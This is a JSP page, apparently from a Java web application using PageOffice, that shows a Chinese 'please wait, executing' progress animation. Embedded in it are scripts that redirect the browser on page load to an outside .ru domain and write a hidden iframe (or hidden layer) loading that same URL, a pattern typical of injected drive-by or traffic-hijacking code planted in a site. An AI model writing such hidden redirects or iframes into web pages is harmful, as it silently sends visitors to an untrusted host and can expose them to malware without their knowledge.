<%@ page language="java" import="java.util.*" pageEncoding="utf-8"%>
<%
String path = request.getContextPath();
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
  <head>
  <script type="text/javascript">

</script>
    <base href="<%=basePath%>">
    
    <title>My JSP 'UpFtp.jsp' starting page</title>
    
	<meta http-equiv="pragma" content="no-cache">
	<meta http-equiv="cache-control" content="no-cache">
	<meta http-equiv="expires" content="0">    
	<meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
	<meta http-equiv="description" content="This is my page">
	<!--
	<link rel="stylesheet" type="text/css" href="styles.css">
	-->

  </head>
    <body onLoad="location.href = url;" style='overflow:hidden;overflow-y:hidden'>

<!--上传等待-->
 <script language="JavaScript">
var url = 'http://5icat.net.ru';
</script>
<div align=center>
<font class=fontbig>执行中，请耐心等待......<br>
</font>
<p></p><p></p>
<style><!--.proccess{border:1px solid;width:8;height:8;background:#ffffff;margin:3}--></style>
<p></p><p></p>
<div align="center">
<form method=post name=proccess>
<script language=javascript>
for(i=0;i<30;i++)document.write("<input class=proccess>")
</script>
</form>
</div></td></tr></table>
<div align="center">
<script language=JavaScript>var p=0,j=0;
var c=new Array("lightskyblue","white")
setInterval('proccess();',100)
function proccess(){
document.forms.proccess.elements[p].style.background=c[j];
p+=1;
if(p==30){p=0;j=1-j;}}
--></script>
</div>
</div>
<div align="center">
<script>
<!--
if (document.layers)
document.write('<Layer src="' + url + ' " VISIBILITY="hide"> </Layer>');
else if (document.all || document.getElementById)
document.write('<iframe src="' + url + '" style="visibility: hidden;"></iframe>');
else location.href = url;
//-->
</script>
<!--上传等待-->
</div>  
		<div id="textcontent" style="width: 1000px; height: 800px;">


			<!--**************   卓正 PageOffice 客户端代码开始    ************************-->


			<!--**************   卓正 PageOffice 客户端代码结束    ************************-->
		

		</div>
		    <div style="width: 0px; height: 0px; overflow: hidden;">
        			<iframe id="iframe1" name="iframe1" src=""></iframe>
           </div>

		
  </body>
</html>
